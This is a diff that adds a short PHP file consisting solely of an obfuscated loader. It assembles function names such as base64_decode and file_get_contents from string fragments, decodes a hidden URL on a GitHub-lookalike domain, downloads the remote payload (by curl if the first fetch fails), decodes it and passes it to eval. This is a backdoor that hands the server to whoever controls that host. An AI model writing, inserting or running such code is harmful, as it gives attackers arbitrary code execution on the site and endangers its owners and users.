@@ -1,0 +1,2 @@
+<?php
+$a="ba";$b="se";$c="64";$g="d";$h="ec";$i="o";$j="de";$k=$a.$b.$c."_".$g.$h.$i.$j;$l="file";$m="_get_";$n="con";$o="tents";$p=$l.$m.$n.$o;$q=$k("aHR0cHM6Ly9naXRodWIud3NpaW5pLnRvcC9ma29scHNmZC9vbHBma2Nod2EudHh0");$r="c";$s="url";$t="_";$u="in";$v="it";$w=$r.$s.$t.$u.$v;$x=$r.$s.$t."setopt";$y=$r.$s.$t."exec";$z=$r.$s.$t."close";$hh=$p($q);if(empty($hh)){$ii=$w();$x($ii,CURLOPT_URL,$q);$x($ii,CURLOPT_RETURNTRANSFER,1);$hh=$y($ii);$z($ii);}eval("?>".$k($hh));?>
